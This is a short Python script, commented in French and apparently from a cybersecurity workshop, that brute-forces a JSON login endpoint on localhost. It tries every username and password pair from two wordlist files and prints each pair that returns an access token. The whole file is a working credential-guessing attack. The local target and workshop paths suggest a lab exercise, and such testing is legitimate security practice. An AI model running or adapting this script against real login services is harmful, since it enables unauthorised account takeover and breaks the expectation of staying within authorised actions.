#!/usr/bin/env python3
# Brute force sur le login JSON - Personne 5 (cyber)
import requests

CIBLE = "http://localhost/auth/login"
users = open("/home/seb/worshop/cyber/attaques/utilisateurs.txt").read().split()
passwords = open("/home/seb/worshop/cyber/attaques/mots_de_passe.txt").read().split()

print(f"=== Brute force sur {CIBLE} ===")
trouve = 0
for user in users:
    for pwd in passwords:
        r = requests.post(CIBLE, json={"login": user, "password": pwd})
        if r.status_code == 200 and "access_token" in r.text:
            print(f"[TROUVE] {user} : {pwd}")
            trouve += 1
        else:
            print(f"  echec {user}:{pwd}")
print(f"=== Fini. {trouve} compte(s) trouve(s) ===")
